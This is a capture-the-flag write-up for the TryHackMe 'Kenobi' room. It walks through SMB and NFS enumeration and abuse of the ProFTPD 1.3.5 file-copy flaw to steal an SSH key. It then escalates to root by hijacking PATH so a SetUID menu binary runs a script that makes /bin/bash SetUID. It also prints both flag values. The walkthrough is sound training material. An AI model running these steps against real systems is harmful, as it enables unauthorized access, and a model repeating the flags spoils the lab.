# Kenobi tryhackme room writeup

# nmap scan shows 7 open ports
[nmap scan result](nmapResult)

## Enumerating port 445 (smb)
- nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $ip
[enumeration result of p445](smbEnumRes)

- result shows 3 shares
- the anonymous share is accessible without any password
```bash
	smbclient //$ip/anonymous -> listing the directory reveal a log.txt file.
```
```bash
	smbget -R smb://$ip/anonymous # downloads every file found in the share recursively to the local machine
```

## Enumerating port 111 (rpcbind)
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.2.252
```
[enumeration result of p111](rpcRes)

- result shows that the /var directory is mountable
```bash
sudo mount $ip:/var /tmp
```
- There wasn't a lot of interesting stuff, and since it is a read-only file system, it wasn't possible to upload a php reverse-shell script to /var/www/html directory

## Enumerating port 21 (ftp)
### banner grabbing 
```bash
nc $ip 21 	# shows the type and version of ftp server running (proftpd 1.3.5).
```
```bash
searchsploit proftpd 1.3.5 	# shows the ftp version is vulnerable to unauthenticated file copying by an ftp client from any directory to another on the server.
```
- After copying the private key of kenobi to the nfs share (/var/tmp), an initial foothold could be gained to the machine using ssh identity login
```bash
ssh -i priv_key kenobi@ip
```
- `cat user.txt` reveals user flag -> d0b0f3f53b6caa532a83915e19224899

# Privilege escalation
- First attempt is to look for SetUID programs that are out of ordinary
```bash
find / -type f -perm -u=s 2>/dev/null
```
- There is one file that is weird (***/usr/bin/menu***) - running it gives 3 options which run system commands (choosing the 3rd option runs the ***ifconfig*** command).

- Looking at the printable part of the executable file reveals that the commands are not using absolute path to be run and they will be searched for using the environment path variable which can be manipulated.

- I created a file called ifconfig, made it executable and added
```bash
#!/bin/bash
chmod u+s /bin/bash
```
inside the file which means if successful we will make bash a SetUID program.

`export PATH="/home/kenobi:$PATH"` 	# makes the directory 'ifconfig' is found in to be searched first when a command is executed.

- Running `/bin/bash -p` -> gives access to the root account.
- Traversing to the homedir of root reveals the root.txt flag (177b3cd8562289f37382721c28381f02).
